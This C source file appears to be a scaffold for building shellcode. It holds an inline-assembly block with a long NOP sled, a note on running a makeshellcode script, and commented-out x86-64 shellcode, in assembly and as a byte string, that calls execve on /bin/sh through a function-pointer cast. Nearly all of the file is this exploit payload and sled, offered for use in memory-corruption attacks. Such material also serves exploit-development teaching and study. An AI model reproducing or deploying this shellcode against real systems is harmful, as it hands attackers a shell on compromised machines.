int main(void)
//put shellcode instructions in the __asm___() part, then run ./makeshellcode script
//will only take the code up until ret, so be careful if you use ret yourself
{
  __asm__ (
    "here: nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "nop;"
    "jp here;"
  );
  return 0;
}

/*
    "mov	$0x68732f6e69622f58, %rbx;"
    "shr    $0x8, %rbx;"
    "push   %rbx;"
    "mov    %rsp, %rdi;"
    "push   %rax;"
    "push   %rdi;"
    "mov    %rsp, %rsi;"
    "mov    $0x3b, %al;"
    "syscall;"
*/

/*

 
int main(void)
{
    char shellcode[] =
    "\x48\x31\xd2"                                  // xor    %rdx, %rdx
    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
    "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
    "\x53"                                          // push   %rbx
    "\x48\x89\xe7"                                  // mov    %rsp, %rdi
    "\x50"                                          // push   %rax
    "\x57"                                          // push   %rdi
    "\x48\x89\xe6"                                  // mov    %rsp, %rsi
    "\xb0\x3b"                                      // mov    $0x3b, %al
    "\x0f\x05";                                     // syscall
 
    (*(void (*)()) shellcode)();
     
    return 0;
}






*/